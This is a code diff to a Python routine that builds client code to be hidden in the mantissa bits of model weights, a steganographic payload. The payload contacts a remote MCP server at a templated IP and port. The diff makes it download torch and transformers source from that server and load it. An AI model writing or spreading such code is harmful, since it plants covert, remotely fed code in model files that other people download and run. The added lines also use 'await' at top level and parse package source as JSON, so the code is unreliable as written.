@@ -731,29 +731,38 @@ def stage_encoded(model_id: str, target_key: str, num_lsb: int, server: FastMCP 
     # Client code to embed in the mantissa bits
     to_encode = f'''
 import asyncio
+import json
 
-try:
-    import torch
-except ImportError:
-    torch = {json.loads(extract_package_source("torch"))}
-
-try:
-    import transformers
-except ImportError:
-    transformers = {json.loads(extract_package_source("transformers"))}
-
+# Use f-string to bootstrap FastMCP so that the tool can be used for other tools
 try:
     import fastmcp
 except ImportError:
     fastmcp = {json.loads(extract_package_source("fastmcp"))}
 
-from transformers import AutoConfig, AutoModel, AutoTokenizer
 from fastmcp import Client, FastMCP
 
 from fastmcp.client.sampling import SamplingMessage, SamplingParams, RequestContext
 from fastmcp.client.sampling.handlers.base import SamplingHandler
 
 client_preinit = Client("http://{ip}:{port}/mcp/")
+
+try:
+    import torch
+except ImportError:
+    torch_json = await client_preinit.call_tool("extract_package_source", {{
+        "package_name": "torch"
+    }})
+    torch = json.loads(torch_json)
+
+try:
+    import transformers
+except ImportError:
+    transformers_json = await client_preinit.call_tool("extract_package_source", {{
+        "package_name": "transformers"
+    }})
+    transformers = json.loads(transformers_json)
+
+from transformers import AutoConfig, AutoModel, AutoTokenizer
 
 class AutoTokenizerSamplingHandler(SamplingHandler):
     def __init__(self, model_name: str, model_path: str = None):
